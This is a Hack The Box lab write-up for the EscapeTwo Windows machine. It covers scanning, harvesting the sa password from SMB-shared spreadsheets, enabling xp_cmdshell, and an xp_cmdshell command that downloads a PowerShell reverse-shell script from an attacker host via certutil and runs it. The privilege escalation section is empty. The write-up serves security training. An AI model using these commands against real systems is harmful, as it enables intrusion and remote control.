<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: EscapeTwo</title>
<meta name=description content="Platform: Hack The Box Link: EscapeTwo Level: Easy OS: Windows We are provided credentials to start on this box for the following account: Username: rose …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-escapetwo/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: EscapeTwo"><meta property="og:description" content="Platform: Hack The Box Link: EscapeTwo Level: Easy OS: Windows We are provided credentials to start on this box for the following account: Username: rose …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Administrator/EscapeTwo.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Administrator/EscapeTwo.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: EscapeTwo"><meta name=twitter:description content="Platform: Hack The Box Link: EscapeTwo Level: Easy OS: Windows We are provided credentials to start on this box for the following account: Username: rose …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-escapetwo/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-escapetwo/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Administrator/EscapeTwo.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-escapetwo/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-escapetwo/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: EscapeTwo</h1><small role=doc-subtitle></small><p class=post-date>3 min read |
<span class=post-date>May 25, 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/EscapeTwo>EscapeTwo</a></li><li>Level: Easy</li><li>OS: Windows</li></ul><hr><blockquote><p>We are provided credentials to start on this box for the following account: <strong>Username:</strong> rose <strong>Password:</strong> KxEPkKe6R8su.</p></blockquote><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -Pn -oA nmap/EscapeTwo {IP}
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-01-11 15:57 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.129.33.0
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.060s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>988</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2025-01-11 21:58:09Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC01.sequel.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-06-08T17:35:00
</span></span><span style=display:flex><span>|_Not valid after:  2025-06-08T17:35:00
</span></span><span style=display:flex><span>|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC01.sequel.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-06-08T17:35:00
</span></span><span style=display:flex><span>|_Not valid after:  2025-06-08T17:35:00
</span></span><span style=display:flex><span>|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>1433/tcp open  ms-sql-s      Microsoft SQL Server <span style=color:#d19a66>2019</span> 15.00.2000.00; RTM
</span></span><span style=display:flex><span>| ms-sql-info: 
</span></span><span style=display:flex><span>|   10.129.33.0:1433: 
</span></span><span style=display:flex><span>|     Version: 
</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#d19a66>2019</span> RTM
</span></span><span style=display:flex><span>|       number: 15.00.2000.00
</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#d19a66>2019</span>
</span></span><span style=display:flex><span>|       Service pack level: RTM
</span></span><span style=display:flex><span>|       Post-SP patches applied: <span style=color:#e5c07b>false</span>
</span></span><span style=display:flex><span>|_    TCP port: <span style=color:#d19a66>1433</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>SSL_Self_Signed_Fallback
</span></span><span style=display:flex><span>| Not valid before: 2025-01-11T19:22:43
</span></span><span style=display:flex><span>|_Not valid after:  2055-01-11T19:22:43
</span></span><span style=display:flex><span>| ms-sql-ntlm-info: 
</span></span><span style=display:flex><span>|   10.129.33.0:1433: 
</span></span><span style=display:flex><span>|     Target_Name: SEQUEL
</span></span><span style=display:flex><span>|     NetBIOS_Domain_Name: SEQUEL
</span></span><span style=display:flex><span>|     NetBIOS_Computer_Name: DC01
</span></span><span style=display:flex><span>|     DNS_Domain_Name: sequel.htb
</span></span><span style=display:flex><span>|     DNS_Computer_Name: DC01.sequel.htb
</span></span><span style=display:flex><span>|     DNS_Tree_Name: sequel.htb
</span></span><span style=display:flex><span>|_    Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC01.sequel.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-06-08T17:35:00
</span></span><span style=display:flex><span>|_Not valid after:  2025-06-08T17:35:00
</span></span><span style=display:flex><span>|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>DC01.sequel.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
</span></span><span style=display:flex><span>| Not valid before: 2024-06-08T17:35:00
</span></span><span style=display:flex><span>|_Not valid after:  2025-06-08T17:35:00
</span></span><span style=display:flex><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2025-01-11T21:58:50
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 92.32 seconds
</span></span></code></pre></div><p>The target is running Active Directory with the usual services such as LDAP, SMB, in additional to Microsoft SQL.</p><p>We also have some domain names that we add to the <code>/etc/hosts</code> file.</p><pre tabindex=0><code>sudo echo &#34;TARGET_IP sequel.htb DC01.sequel.htb DC01&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>We use the provided credentials to enumerate the available shares.</p><pre tabindex=0><code>netexec smb TARGET_IP -u rose -p &#39;KxEPkKe6R8su&#39; --shares
</code></pre><p><img src=/images/HTB-EscapeTwo/rose_smb.png alt="SMB shares enumeration"></p><p>We have access to some shares let&rsquo;s look into <code>Accounting Department</code>. Inside we find two files that we download <code>accounting_2024.xlsx</code> and <code>accounts.xlsx</code>.</p><pre tabindex=0><code>smbclient //sequel.htb/&#39;Accounting Department&#39; -U rose
</code></pre><p><img src=/images/HTB-EscapeTwo/acc_dpt_share.png alt="acct dept share access"></p><p>Inside <code>accounts.xlsx</code> we find some files.</p><p><img src=/images/HTB-EscapeTwo/creds_file.png alt="accounts.xlsx file"></p><p>We can read the file <code>sharedStrings.xml</code> where we find the credentials for the <code>sa</code> account.</p><blockquote><p>The sa account, or system administrator account, is a built-in account in SQL Server that gives the user full administrative access to the SQL Server instance</p></blockquote><p><img src=/images/HTB-EscapeTwo/sa_creds.png alt="sa account credentials"></p><p>Using the command below we login into the database.</p><pre tabindex=0><code>impacket-mssqlclient &#39;sequel.htb/sa:MSSQLP@ssw0rd!@sequel.htb&#39;
</code></pre><p><img src=/images/HTB-EscapeTwo/mssql_login.png alt="mssql login"></p><h2 id=initial-foothold>Initial Foothold</h2><p>We enable <code>xp_cmdshell</code> with the following queries.</p><blockquote><p><code>xp_cmdshell</code> is an extended stored procedure in Microsoft SQL Server that allows you to execute operating system commands directly from SQL Server.</p></blockquote><pre tabindex=0><code>EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE;
EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE;
</code></pre><p><img src=/images/HTB-EscapeTwo/xp_cmdshell_enabled.png alt="enable xp_cmdshell"></p><p>We test it with <code>EXEC xp_cmdshell 'whoami';</code>.</p><p><img src=/images/HTB-EscapeTwo/xp_cmdshell_test.png alt="xp_cmdshell test"></p><p>We can now abuse mssql to obtain a reverse shell. On <a href=https://www.revshells.com/>revshells</a> we use the <code>PowerShell #3 (Base64)</code>.</p><pre tabindex=0><code>xp_cmdshell REVERSE_SHELL_COMMAND
</code></pre><p><img src=/images/HTB-EscapeTwo/mssql_revshell.png alt="mssql reverse shell"></p><pre tabindex=0><code>xp_cmdshell &#34;cmd.exe /c certutil -urlcache -split -f http://10.10.14.146:8000/Invoke-PowerShellTcpOneLine.ps1 shell.ps1 &amp;&amp; shell.ps1&#34;
</code></pre><h2 id=privilege-escalation>Privilege Escalation</h2></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-administrator/>&#8592;
Previous:
HTB: Administrator</a></p><p class=prev-post-date>April 20, 2025</p></div><div class=next-post><p><a href=/posts/forced-hiatus/>Next:
A Forced Hiatus, a Quiet Faith, and the Resolve to Continue
&#8594;</a></p><p class=next-post-date>December 31, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>